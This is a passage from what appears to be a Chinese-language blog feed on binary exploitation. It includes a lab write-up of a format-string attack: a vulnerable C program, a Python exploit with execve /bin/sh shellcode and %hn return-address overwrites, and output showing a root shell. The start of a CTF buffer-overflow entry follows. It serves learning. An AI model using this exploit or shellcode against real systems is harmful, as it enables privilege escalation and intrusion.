*framep;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;asm&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%ebp,%0&amp;quot;&lt;/span&gt; : &lt;span class=&#34;string&#34;&gt;&amp;quot;=r&amp;quot;&lt;/span&gt; (framep));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ret = framep +&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the address of the input array: 0x%.8x\n&amp;quot;&lt;/span&gt;,(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt;)str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the value of the frame pointer: 0x%.8x\n&amp;quot;&lt;/span&gt;,(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt;)framep);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the value of the return address: 0x%.8x\n&amp;quot;&lt;/span&gt;,*ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the value of the return address: 0x%.8x\n&amp;quot;&lt;/span&gt;,*ret);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc,&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	FILE *badfile;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; str[&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	badfile = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;badfile&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fread(str,&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;,badfile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fmtstr(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;编译:gcc -m32 -z execstack -o fmtvul fmtvul.c&lt;/p&gt;
&lt;p&gt;echo $(printf “\xaa\xaa\xaa\xaa”).%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x.%.8x &amp;gt; badfile&lt;/p&gt;
&lt;p&gt;和书上的不太一样,这里是第22个,不对,是第21个,第一个是”\xaa\xaa\xaa\xaa”这个,不算,所以%.8x是输出了20个后到了aaaaaaaa.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/cssec/strings/shell# ./fmtvul&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the address of the input &lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xffffd514&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the value of the frame pointer: &lt;span class=&#34;number&#34;&gt;0xffffd4e8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the value of the &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; address: &lt;span class=&#34;number&#34;&gt;0x565556fd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;����&lt;span class=&#34;number&#34;&gt;.565556&lt;/span&gt;fd&lt;span class=&#34;number&#34;&gt;.00000000&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.565555f&lt;/span&gt;9&lt;span class=&#34;number&#34;&gt;.5655583&lt;/span&gt;c&lt;span class=&#34;number&#34;&gt;.56555839&lt;/span&gt;.ffffd4e8.ffffd4ec.f7fbd000&lt;span class=&#34;number&#34;&gt;.56556f&lt;/span&gt;cc.ffffd5e8&lt;span class=&#34;number&#34;&gt;.565556f&lt;/span&gt;d.ffffd514&lt;span class=&#34;number&#34;&gt;.00000001&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.000000&lt;/span&gt;c8&lt;span class=&#34;number&#34;&gt;.56558160&lt;/span&gt;.f7ffdc30&lt;span class=&#34;number&#34;&gt;.00000200&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.00000400&lt;/span&gt;.ffffd694&lt;span class=&#34;number&#34;&gt;.56558160&lt;/span&gt;.aaaaaaaa&lt;span class=&#34;number&#34;&gt;.382e252&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.2e252&lt;/span&gt;e78&lt;span class=&#34;number&#34;&gt;.252e7838&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.2e78382&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.78382e25&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.382e252&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.2e252&lt;/span&gt;e78&lt;span class=&#34;number&#34;&gt;.252e7838&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.2e78382&lt;/span&gt;e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;�the value of the &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; address: &lt;span class=&#34;number&#34;&gt;0x565556fd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;返回地址 0xffffd4e8 + 0x4 &amp;#x3D; 0xffffd4ec&lt;/p&gt;
&lt;p&gt;实验中跳转到str数组偏移量0x90的地方, 0xffffd514 +0x90 &amp;#x3D; 0xffffd5a4&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;\x31\xc0\x31\xdb\xb0\xd5\xcd\x80&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ).encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;latin-1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;N = &lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content = &lt;span class=&#34;built_in&#34;&gt;bytearray&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(N))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;start = N - &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content[start:] = shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr2 = &lt;span class=&#34;number&#34;&gt;0xffffd3de&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr1 = &lt;span class=&#34;number&#34;&gt;0xffffd3dc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] = (addr1).to_bytes(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,byteorder=&lt;span class=&#34;string&#34;&gt;&amp;#x27;little&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;] = (&lt;span class=&#34;string&#34;&gt;&amp;quot;@@@@&amp;quot;&lt;/span&gt;).encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;latin-1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;] = (addr2).to_bytes(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,byteorder=&lt;span class=&#34;string&#34;&gt;&amp;#x27;little&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;small = &lt;span class=&#34;number&#34;&gt;0xd484&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; -&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;large = &lt;span class=&#34;number&#34;&gt;0xffff&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0xd484&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;string&#34;&gt;&amp;quot;%.8x&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;&amp;quot;%.&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(small) + &lt;span class=&#34;string&#34;&gt;&amp;quot;x%hn%.&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(large) +&lt;span class=&#34;string&#34;&gt;&amp;quot;x%hn&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fmt = (s).encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;latin-1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;content[&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(fmt)] = fmt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file=&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;badfile&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;wb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file.write(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;                                               ̀the value of the &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; address: &lt;span class=&#34;number&#34;&gt;0xffffd4ec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Segmentation fault (core dumped)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;地址修改对了,但还是报错了,和libc版本有关系?还是需要去除保护?-fno-stack-protector&lt;/p&gt;
&lt;p&gt;the address of the input array: 0xffffd514&lt;br&gt;the value of the frame pointer: 0xffffd4f8&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/cssec/strings/shell# ./fmtvul&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the address of the input &lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0xffffd544&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the value of the frame pointer: &lt;span class=&#34;number&#34;&gt;0xffffd528&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the value of the &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; address: &lt;span class=&#34;number&#34;&gt;0x56555691&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;����&lt;span class=&#34;number&#34;&gt;.56555691&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.00000000&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.565555&lt;/span&gt;a9&lt;span class=&#34;number&#34;&gt;.565557&lt;/span&gt;ac&lt;span class=&#34;number&#34;&gt;.565557&lt;/span&gt;a9.ffffd52c.ffffd528.f7fbd000&lt;span class=&#34;number&#34;&gt;.56556f&lt;/span&gt;d0.ffffd618&lt;span class=&#34;number&#34;&gt;.56555691&lt;/span&gt;.ffffd544&lt;span class=&#34;number&#34;&gt;.00000001&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.000000&lt;/span&gt;c8&lt;span class=&#34;number&#34;&gt;.56558160&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.00000000&lt;/span&gt;.aaaaaaaa&lt;span class=&#34;number&#34;&gt;.382e252&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.2e252&lt;/span&gt;e78&lt;span class=&#34;number&#34;&gt;.252e7838&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.2e78382&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.78382e25&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.382e252&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.2e252&lt;/span&gt;e78&lt;span class=&#34;number&#34;&gt;.252e7838&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.2e78382&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.78382e25&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.382e252&lt;/span&gt;e&lt;span class=&#34;number&#34;&gt;.2e252&lt;/span&gt;e78&lt;span class=&#34;number&#34;&gt;.252e7838&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;�the value of the &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; address: &lt;span class=&#34;number&#34;&gt;0x56555691&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;问题出在了这里,在我们这里编译的时候,是第17个位置存储着str数组,和书上不一样,&lt;font color=&#34;red&#34;&gt;这可能和编译器版本等有关,所以还是要具体问题具体分析,看懂了书里的,然后在实际操作中根据实际情况动态修改一些东西才可以&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;从root用户切换到ubuntu也会改变一些东西,地址也变了&lt;/p&gt;
&lt;p&gt;the address of the input array: 0xffffd3f4                0xffffd3f4 + 0x90 &amp;#x3D; 0xffffd484&lt;br&gt;the value of the frame pointer: 0xffffd3d8&lt;br&gt;the value of the return address: 0x5655569&lt;/p&gt;
&lt;p&gt;修改exp里面对应的地址和%x的个数,然后就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000000000000000000000000000000040404040&lt;/span&gt;�������������������������������������������������������������������������&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;�&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;۰�̀&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;�Ph&lt;span class=&#34;comment&#34;&gt;//shh/bin��PS�ᙰ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                                               ̀the value of the &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; address: &lt;span class=&#34;number&#34;&gt;0xffffd484&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uid=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;(root) gid=&lt;span class=&#34;number&#34;&gt;500&lt;/span&gt;(ubuntu) groups=&lt;span class=&#34;number&#34;&gt;500&lt;/span&gt;(ubuntu),&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;(adm),&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;(cdrom),&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;(sudo),&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;(dip),&lt;span class=&#34;number&#34;&gt;46&lt;/span&gt;(plugdev),&lt;span class=&#34;number&#34;&gt;113&lt;/span&gt;(lpadmin),&lt;span class=&#34;number&#34;&gt;114&lt;/span&gt;(sambashare)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;p&gt;%n$x 表示格式字符串后的第n个数据&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-01-22T04:51:43.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-4-one-gadget/</id>
        <title>pwn入门-4-one_gadget</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-4-one-gadget/"/>
        <content type="html">&lt;p&gt;未完待续: exp有问题…&lt;/p&gt;
&lt;p&gt;题目来源:asis ctf quals 2017:start hard&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/boslash/bo8/tree/master/start_hard&#34;&gt;https://github.com/boslash/bo8/tree/master/start_hard&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall main(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; a1, char **a2, char **a3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char buf[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;]; // [rsp+10h] [rbp-10h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, 0x400uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; 0LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;用ida查看反汇编代码,一个很明显的缓冲区溢出漏洞,要看开启了什么保护,没有canary,栈好利用一些,但是开了nx,所以得用rop之类的&lt;/p&gt;
